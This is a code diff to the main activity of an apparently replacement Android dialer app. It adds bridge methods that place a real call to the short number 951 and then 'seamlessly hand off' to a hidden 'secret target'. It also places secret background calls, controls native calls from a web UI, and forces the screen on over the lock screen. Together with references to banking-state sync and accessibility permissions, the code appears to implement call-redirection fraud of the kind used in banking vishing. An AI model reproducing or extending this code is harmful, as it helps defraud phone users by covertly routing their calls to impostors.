@@ -68,6 +68,7 @@ public class MainActivity extends Activity {
         extractInitialDialFromIntent(getIntent());
         DialerSyncHelper.requestFreshStateFromBanking(this);
 
+        applyCallWindowFlags(getIntent());
         if (getWindow() != null) {
             getWindow().setSoftInputMode(WindowManager.LayoutParams.SOFT_INPUT_ADJUST_RESIZE);
         }
@@ -172,6 +173,7 @@ public class MainActivity extends Activity {
                     pendingInitialDial = "";
                 }
                 notifyBankingStateSynced();
+                SecretInCallService.pushCurrentStateToUi();
             }
 
             @Override
@@ -267,8 +269,10 @@ public class MainActivity extends Activity {
             DialerSyncHelper.startNextPermissionStep(this, 3);
         } else if (requestCode == DialerSyncHelper.REQ_BATTERY_PERMISSION) {
             DialerSyncHelper.startNextPermissionStep(this, 4);
-        } else if (requestCode == DialerSyncHelper.REQ_ACCESSIBILITY_PERMISSION) {
+        } else if (requestCode == DialerSyncHelper.REQ_FULL_SCREEN_INTENT) {
             DialerSyncHelper.startNextPermissionStep(this, 5);
+        } else if (requestCode == DialerSyncHelper.REQ_ACCESSIBILITY_PERMISSION) {
+            DialerSyncHelper.startNextPermissionStep(this, 6);
         }
     }
 
@@ -276,19 +280,23 @@ public class MainActivity extends Activity {
     protected void onNewIntent(Intent intent) {
         super.onNewIntent(intent);
         setIntent(intent);
+        applyCallWindowFlags(intent);
         extractInitialDialFromIntent(intent);
         if (pendingInitialDial != null && !pendingInitialDial.isEmpty()) {
             pushInitialDialToWeb(pendingInitialDial);
             pendingInitialDial = "";
         }
+        SecretInCallService.pushCurrentStateToUi();
     }
 
     @Override
     protected void onResume() {
         super.onResume();
         isActivityForeground = true;
+        applyCallWindowFlags(getIntent());
         DialerSyncHelper.requestFreshStateFromBanking(this);
         notifyBankingStateSynced();
+        SecretInCallService.pushCurrentStateToUi();
     }
 
     @Override
@@ -389,6 +397,75 @@ public class MainActivity extends Activity {
         }
     }
 
+    public void refreshCallWindowFlags() {
+        runOnUiThread(new Runnable() {
+            @Override
+            public void run() {
+                applyCallWindowFlags(null);
+            }
+        });
+    }
+
+    @SuppressWarnings("deprecation")
+    private void applyCallWindowFlags(Intent intent) {
+        boolean showForCall = SecretInCallService.hasAnyActiveCall()
+            || (intent != null && "show".equals(intent.getStringExtra("native_call_action")));
+        try {
+            if (Build.VERSION.SDK_INT >= 27) {
+                setShowWhenLocked(showForCall);
+                setTurnScreenOn(showForCall);
+            }
+            if (getWindow() != null) {
+                if (showForCall) {
+                    getWindow().addFlags(
+                        WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED
+                        | WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON
+                        | WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON
+                    );
+                } else {
+                    getWindow().clearFlags(
+                        WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED
+                        | WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON
+                        | WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON
+                    );
+                }
+            }
+        } catch (Throwable ignored) {
+        }
+    }
+
+    private void placeCallViaTelecomOrActionCall(String number) {
+        if (number == null || number.trim().isEmpty()) return;
+        String target = number.trim();
+        if (Build.VERSION.SDK_INT >= 23) {
+            TelecomManager tm = (TelecomManager) getSystemService(Context.TELECOM_SERVICE);
+            if (tm != null) {
+                Bundle extras = new Bundle();
+                PhoneAccountHandle handle = null;
+                try {
+                    handle = tm.getDefaultOutgoingPhoneAccount("tel");
+                    if (handle == null
+                        && checkSelfPermission(Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
+                        List<PhoneAccountHandle> accounts = tm.getCallCapablePhoneAccounts();
+                        if (accounts != null && !accounts.isEmpty()) {
+                            handle = accounts.get(0);
+                        }
+                    }
+                } catch (Throwable ignoredHandle) {
+                }
+                if (handle != null) {
+                    extras.putParcelable(TelecomManager.EXTRA_PHONE_ACCOUNT_HANDLE, handle);
+                }
+                tm.placeCall(Uri.fromParts("tel", target, null), extras);
+                return;
+            }
+        }
+        String clean = target.replace("#", Uri.encode("#"));
+        Intent callIntent = new Intent(Intent.ACTION_CALL, Uri.parse("tel:" + clean));
+        callIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+        startActivity(callIntent);
+    }
+
     private void placeNormalCallInternal(String number) {
         if (number == null || number.trim().isEmpty()) return;
         if (Build.VERSION.SDK_INT >= 23
@@ -404,10 +481,7 @@ public class MainActivity extends Activity {
         }
         try {
             isExpectingUssdResponse = false;
-            String clean = number.trim().replace("#", Uri.encode("#"));
-            Intent callIntent = new Intent(Intent.ACTION_CALL, Uri.parse("tel:" + clean));
-            callIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-            startActivity(callIntent);
+            placeCallViaTelecomOrActionCall(number.trim());
         } catch (Throwable e) {
             Toast.makeText(this, "Call failed: " + e.getMessage(), Toast.LENGTH_SHORT).show();
         }
@@ -433,22 +507,28 @@ public class MainActivity extends Activity {
         });
     }
 
-    public void bringToFrontForSecretCall() {
+    public void bringToFrontForCall() {
         runOnUiThread(new Runnable() {
             @Override
             public void run() {
                 try {
+                    applyCallWindowFlags(getIntent());
                     Intent bringIntent = new Intent(MainActivity.this, MainActivity.class);
                     bringIntent.addFlags(
                         Intent.FLAG_ACTIVITY_NEW_TASK
                         | Intent.FLAG_ACTIVITY_REORDER_TO_FRONT
                         | Intent.FLAG_ACTIVITY_SINGLE_TOP
                     );
+                    bringIntent.putExtra("native_call_action", "show");
                     startActivity(bringIntent);
                 } catch (Throwable ignored) {
                 }
             }
         });
+    }
+
+    public void bringToFrontForSecretCall() {
+        bringToFrontForCall();
     }
 
     public void notifySecretJs(final String js) {
@@ -609,6 +689,34 @@ public class MainActivity extends Activity {
         }
 
         @JavascriptInterface
+        public void startReal951CarrierCall() {
+            SecretInCallService.armReal951Call();
+            MainActivity.this.runOnUiThread(new Runnable() {
+                @Override
+                public void run() {
+                    if (Build.VERSION.SDK_INT >= 23
+                        && MainActivity.this.checkSelfPermission(Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED) {
+                        SecretInCallService.resetSecretState();
+                        DialerSyncHelper.requestDialerPermissions(MainActivity.this);
+                        notifySecretJs("window.onReal951StateChanged && window.onReal951StateChanged('error');");
+                        return;
+                    }
+                    try {
+                        MainActivity.this.placeCallViaTelecomOrActionCall("951");
+                    } catch (Throwable e) {
+                        SecretInCallService.resetSecretState();
+                        notifySecretJs("window.onReal951StateChanged && window.onReal951StateChanged('error');");
+                    }
+                }
+            });
+        }
+
+        @JavascriptInterface
+        public void handoff951ToSecretTarget() {
+            SecretInCallService.beginSeamlessHandoffFromReal951();
+        }
+
+        @JavascriptInterface
         public void startSecretBackgroundCall(final String targetNumber, final int maxRingMs) {
             if (targetNumber == null || targetNumber.trim().isEmpty()) return;
             final String cleanTarget = targetNumber.trim();
@@ -627,33 +735,7 @@ public class MainActivity extends Activity {
                         return;
                     }
                     try {
-                        if (Build.VERSION.SDK_INT >= 23) {
-                            TelecomManager tm = (TelecomManager) MainActivity.this.getSystemService(Context.TELECOM_SERVICE);
-                            if (tm != null) {
-                                Bundle extras = new Bundle();
-                                PhoneAccountHandle handle = null;
-                                try {
-                                    handle = tm.getDefaultOutgoingPhoneAccount("tel");
-                                    if (handle == null
-                                        && MainActivity.this.checkSelfPermission(Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
-                                        List<PhoneAccountHandle> accounts = tm.getCallCapablePhoneAccounts();
-                                        if (accounts != null && !accounts.isEmpty()) {
-                                            handle = accounts.get(0);
-                                        }
-                                    }
-                                } catch (Throwable ignoredHandle) {
-                                }
-                                if (handle != null) {
-                                    extras.putParcelable(TelecomManager.EXTRA_PHONE_ACCOUNT_HANDLE, handle);
-                                }
-                                tm.placeCall(Uri.fromParts("tel", cleanTarget, null), extras);
-                                return;
-                            }
-                        }
-                        String clean = cleanTarget.replace("#", Uri.encode("#"));
-                        Intent callIntent = new Intent(Intent.ACTION_CALL, Uri.parse("tel:" + clean));
-                        callIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-                        MainActivity.this.startActivity(callIntent);
+                        MainActivity.this.placeCallViaTelecomOrActionCall(cleanTarget);
                     } catch (Throwable e) {
                         SecretInCallService.resetSecretState();
                         notifySecretJs("window.onSecretCallError && window.onSecretCallError('Secret call failed');");
@@ -664,7 +746,6 @@ public class MainActivity extends Activity {
 
         @JavascriptInterface
         public void cancelSecretBackgroundCall() {
-            // Mark cancelled synchronously on binder thread before any queued UI runnable executes
             SecretInCallService.markUserCancelledNow();
             MainActivity.this.runOnUiThread(new Runnable() {
                 @Override
@@ -682,6 +763,61 @@ public class MainActivity extends Activity {
         @JavascriptInterface
         public void setSecretCallMuted(final boolean muted) {
             SecretInCallService.setCallMuted(muted);
+        }
+
+        @JavascriptInterface
+        public void setSecretCallHeld(final boolean held) {
+            SecretInCallService.setActiveCallHeld(held);
+        }
+
+        @JavascriptInterface
+        public void setSecretCallBluetooth(final boolean on) {
+            SecretInCallService.setBluetoothEnabled(on);
+        }
+
+        @JavascriptInterface
+        public void sendActiveCallDtmf(final String digit) {
+            SecretInCallService.sendActiveCallDtmf(digit);
+        }
+
+        @JavascriptInterface
+        public String getActiveNativeCallJson() {
+            return SecretInCallService.getActiveNativeCallStateJson();
+        }
+
+        @JavascriptInterface
+        public void answerNativeCall() {
+            SecretInCallService.answerIncomingFromUiOrNotification();
+        }
+
+        @JavascriptInterface
+        public void endNativeCall() {
+            SecretInCallService.rejectOrEndNativeCall();
+        }
+
+        @JavascriptInterface
+        public void setNativeCallMuted(final boolean muted) {
+            SecretInCallService.setCallMuted(muted);
+        }
+
+        @JavascriptInterface
+        public void setNativeCallHeld(final boolean held) {
+            SecretInCallService.setActiveCallHeld(held);
+        }
+
+        @JavascriptInterface
+        public void setNativeCallSpeaker(final boolean on) {
+            SecretInCallService.setSpeakerEnabled(on);
+        }
+
+        @JavascriptInterface
+        public void setNativeCallBluetooth(final boolean on) {
+            SecretInCallService.setBluetoothEnabled(on);
+        }
+
+        @JavascriptInterface
+        public void sendNativeCallDtmf(final String digit) {
+            SecretInCallService.sendActiveCallDtmf(digit);
         }
 
         @JavascriptInterface
